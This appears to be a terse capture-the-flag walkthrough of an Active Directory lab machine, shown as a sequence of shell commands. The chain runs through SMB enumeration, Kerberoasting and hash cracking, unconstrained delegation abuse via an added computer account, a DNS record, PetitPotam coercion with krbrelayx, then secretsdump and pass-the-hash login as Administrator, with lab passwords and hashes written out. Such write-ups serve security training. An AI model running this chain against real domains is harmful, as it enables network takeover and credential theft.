...
```shell
hyena@hyena$ nmap -sS -Pn -min-rate 5000 --max-retries 1 -T4 -p- 10.129.234.69
...
```shell
hyena@hyena$ sudo nmap -Pn -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,21,80 10.129.234.69
...
```shell
hyena@hyena$ sudo sh -c 'echo "10.129.234.69 DC1.delegate.vl delegate.vl" >> /etc/hosts'
```
...
```shell
hyena@hyena$ netexec smb 10.129.234.69 -u "guest" -p "" --rid-brute
...
```shell
hyena@hyena$ cat > users_delegate.txt << 'EOF'
Administrator
Guest
krbtgt
DC1$
...
```shell
hyena@hyena$ smbclient //10.129.234.69/NETLOGON -N
smb: \> ls
  users.bat
smb: \> get users.bat
```
...
```shell
hyena@hyena$ netexec smb 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123' --shares
...
```shell
hyena@hyena$ netexec ldap 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123' --users
...
```shell
hyena@hyena$ netexec ldap 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123' --groups
...
```shell
hyena@hyena$ bloodyAD --host 10.129.234.69 -u A.Briggs -p 'P4ssw0rd1#123' -d delegate.vl get writable
...
```shell
hyena@hyena$ python3 targetedKerberoast.py -v -d delegate.vl -u A.Briggs -p 'P4ssw0rd1#123'
```

This yields a crackable TGS-REP hash, which I feed straight into hashcat:

```shell
hyena@hyena$ hashcat -m 13100 nthompson_hash.txt /usr/share/wordlists/rockyou.txt --force
...
```shell
hyena@hyena$ evil-winrm -i 10.129.234.69 -u N.Thompson -p 'KALEB_2341'
...
```shell
hyena@hyena$ python3 /home/hyena/.local/bin/addcomputer.py -dc-ip 10.129.234.69 -computer-name evil$ -computer-pass 'P@$$word123!' delegate.vl/N.Thompson:KALEB_2341
...
```shell
hyena@hyena$ bloodyAD --host 10.129.234.69 -u N.Thompson -p KALEB_2341 -d delegate.vl add uac evil$ -f TRUSTED_FOR_DELEGATION
...
```shell
hyena@hyena$ python3 dnstool.py -u 'delegate.vl\N.Thompson' -p KALEB_2341 -r evil.delegate.vl -a add -t A -d 10.10.14.95 -dns-ip 10.129.234.69 DC1.delegate.vl
...
```shell
hyena@hyena$ python3 krbrelayx.py -hashes :e606ba0be45573509f873c0a6f79e7ec
```
...
```shell
hyena@hyena$ python3 PetitPotam.py -u 'evil$' -p 'P@$$word123!' -d delegate.vl -dc-ip 10.129.234.69 evil.delegate.vl 10.129.234.69
...
```shell
hyena@hyena$ export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```
...
```shell
hyena@hyena$ impacket-secretsdump -k -no-pass DC1.delegate.vl
...
```shell
hyena@hyena$ evil-winrm -i 10.129.234.69 -u Administrator -H c32198ceab4cc695e65045562aa3ee93
